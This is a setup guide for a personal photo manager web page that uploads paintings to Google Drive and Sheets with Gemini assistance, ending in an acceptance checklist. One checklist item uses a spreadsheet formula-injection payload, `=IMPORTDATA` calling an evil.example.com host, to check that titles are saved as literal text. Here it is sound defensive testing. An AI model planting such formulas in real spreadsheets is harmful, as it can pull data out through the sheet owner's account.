# Photo Manager — Setup

## One-time Google setup

### OAuth (Drive + Sheets)
1. Go to https://console.cloud.google.com → select the project that issued the OAuth client `754552250731-hdl67ujna2lk1lataah35mnl69emi8qt`
2. **OAuth consent screen** → External, Testing. Add `Sveta.Mordkovich@basis.com` as a test user. Add scopes `https://www.googleapis.com/auth/drive.file` and `https://www.googleapis.com/auth/spreadsheets`.
3. **Credentials** → edit the OAuth client → Authorized JavaScript origins: add `http://localhost:8000` and `http://127.0.0.1:8000`.
4. **APIs & Services** → enable **Google Drive API** and **Google Sheets API**.

### Gemini API key
1. Visit https://aistudio.google.com/apikey, sign in, create a key. Free tier is 1500 req/day, 15 RPM.
2. On first photo upload, the manager will prompt you to paste this key. It's saved in your browser only (localStorage).

## Running the page

```bash
cd /Users/sveta.mordkovich/private/sveta-colours
python3 -m http.server 8000
```

Open `http://localhost:8000/tools/photo_manager.html` (NOT `file://`).

## Acceptance checklist
- [ ] 30-MP painting upload → Drive file is full resolution, not a thumbnail
- [ ] Title `=IMPORTDATA("https://evil.example.com")` saves as a literal string in Sheets, no formula
- [ ] Reload page mid-flow → no stuck spinners, no orphan Drive file with no Sheets row
- [ ] OAuth popup closed by user → status shows "Sign-in cancelled," no infinite spinner
- [ ] iPhone JPEG with EXIF orientation 6 → preview shows it the right way up, Drive file is also correct
- [ ] AI offline (Gemini quota / no key) → manual-paste button works as fallback
- [ ] All form fields keyboard-reachable from the file input through Save
- [ ] Auto-correct twice in a row on the same upload doesn't double-crop
